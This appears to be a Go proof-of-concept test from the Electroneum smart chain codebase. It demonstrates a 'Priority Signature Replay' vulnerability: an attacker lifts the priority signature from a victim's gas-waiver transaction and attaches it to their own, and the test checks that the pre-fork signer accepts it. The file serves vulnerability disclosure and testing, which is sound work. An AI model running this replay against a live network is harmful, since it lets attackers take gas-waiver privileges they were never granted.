package types

import (
	"fmt"
	"math/big"
	"testing"

	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/crypto"
)

// TestPrioritySignatureReplay_PoC demonstrates the Priority Signature Replay vulnerability.
// It shows how an attacker can steal a priority signature from a victim's transaction
// and use it on their own transaction to gain unauthorized privileges (like gas waiver).
func TestPrioritySignatureReplay_PoC(t *testing.T) {
	fmt.Println("--- STARTING PRIORITY SIGNATURE REPLAY PoC ---")

	var (
		victimKey, _   = crypto.GenerateKey()
		attackerKey, _ = crypto.GenerateKey()
		priorityKey, _ = crypto.GenerateKey()
		signer         = NewLondonSigner(big.NewInt(1))
		priorityPub    = crypto.ECDSAPubkeyToPublicKey(priorityKey.PublicKey)
		attackerAddr   = crypto.PubkeyToAddress(attackerKey.PublicKey)
		victimAddr     = crypto.PubkeyToAddress(victimKey.PublicKey)
	)

	fmt.Printf("Victim Address: %x\n", victimAddr)
	fmt.Printf("Attacker Address: %x\n", attackerAddr)
	fmt.Printf("Priority Public Key (Waiver Provider): %x\n", priorityPub)

	// 1. Victim creates and signs a priority tx.
	// This represents a legitimate use of a gas waiver.
	txdata := &PriorityTx{
		ChainID:   big.NewInt(1),
		Nonce:     10,
		GasTipCap: big.NewInt(0), // Waiver requested
		GasFeeCap: big.NewInt(0), // Waiver requested
		Gas:       21000,
		To:        &common.Address{0x01},
		Value:     big.NewInt(1),
	}
	victimTx, err := SignNewPriorityTx(victimKey, priorityKey, signer, txdata)
	if err != nil {
		t.Fatal(err)
	}

	// Verify victim tx is valid and linked to the priority key.
	recoveredPub, err := PrioritySender(signer, victimTx)
	if err != nil {
		t.Fatal(err)
	}
	fmt.Printf("Initial State: Victim Tx Priority Sender verified as %x\n", recoveredPub)

	// 2. Attacker's Action: INTERCEPT and REPLAY
	fmt.Println("Attack Step: Attacker intercepts victim's tx and steals Priority Signature (V,R,S)")
	pV, pR, pS := victimTx.RawPrioritySignatureValues()

	// Attacker creates their own transaction with the EXACT same body as the victim's.
	// On Electroneum SC, certain system transactions or bridge transfers might
	// have predictable bodies if they are automated.
	attackerTxData := &PriorityTx{
		ChainID:   big.NewInt(1),
		Nonce:     10,
		GasTipCap: big.NewInt(0),
		GasFeeCap: big.NewInt(0),
		Gas:       21000,
		To:        &common.Address{0x01},
		Value:     big.NewInt(1),
	}
	attackerTx := NewTx(attackerTxData)

	// Attacker signs the sender slot with their own key.
	h := signer.Hash(attackerTx)
	attackerSig, err := crypto.Sign(h[:], attackerKey)
	if err != nil {
		t.Fatal(err)
	}
	attackerTx, err = attackerTx.WithSignature(signer, attackerSig)
	if err != nil {
		t.Fatal(err)
	}

	// Attacker pastes the stolen priority signature onto their own transaction.
	inner := attackerTx.inner.copy().(*PriorityTx)
	inner.PriorityV = pV
	inner.PriorityR = pR
	inner.PriorityS = pS
	attackerTx = &Transaction{inner: inner, time: attackerTx.time}

	// 3. Verification of Vulnerability
	fmt.Println("Verification: Checking if LondonSigner (Pre-Fork) accepts the replayed signature...")
	replayedPub, err := PrioritySender(signer, attackerTx)

	sender, _ := Sender(signer, attackerTx)
	fmt.Printf("Attacker Tx Sender: %x\n", sender)
	fmt.Printf("Attacker Tx Priority Sender recovered as: %x\n", replayedPub)

	if err == nil && replayedPub == priorityPub && sender == attackerAddr {
		fmt.Println("VULNERABILITY CONFIRMED: Attacker successfully replayed priority signature!")
		fmt.Printf("Impact: Attacker (%x) gained privileges of Priority Key (%x) without authorization for their account.\n", attackerAddr, priorityPub)
	} else {
		fmt.Println("NO VULNERABILITY: Attack failed.")
		t.Fatal("PoC failed to demonstrate vulnerability")
	}

	fmt.Println("--- PoC COMPLETE ---")
}
